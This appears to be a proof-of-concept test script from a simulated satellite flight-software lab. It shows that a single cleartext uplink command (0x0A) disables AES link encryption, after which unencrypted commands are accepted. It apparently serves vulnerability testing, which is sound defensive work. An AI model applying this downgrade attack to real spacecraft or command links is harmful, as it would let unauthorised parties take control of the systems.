#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


def main(dev, ev):
    # V0-10: AES_CONFIG accepts the toggle in CLEAR TEXT even while the
    # secure link is on (odd length -> untaken decrypt branch). Anyone can
    # switch the crypto off with a single uplink byte.
    tms = dev.tc(0x0A, b"\x00", via="radio", encrypt=False)   # "off", raw
    st = dev.find(tms, 0x0A)
    ev.log(f"AES_CONFIG status: {st}")
    check(st and st[0].u8(1) == 0, "secure link must be OFF now")
    ev.log(f"device state secure={dev.sim.secure}")
    check(dev.sim.secure is False, "state must be secure=False")
    # and it stays off for every subsequent command, no key needed anymore
    tms = dev.tc(0x01, b"", via="radio", encrypt=False)
    check(dev.find(tms, 0x01), "cleartext PING ACK works after downgrade")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-10 cleartext crypto downgrade toggle", main))
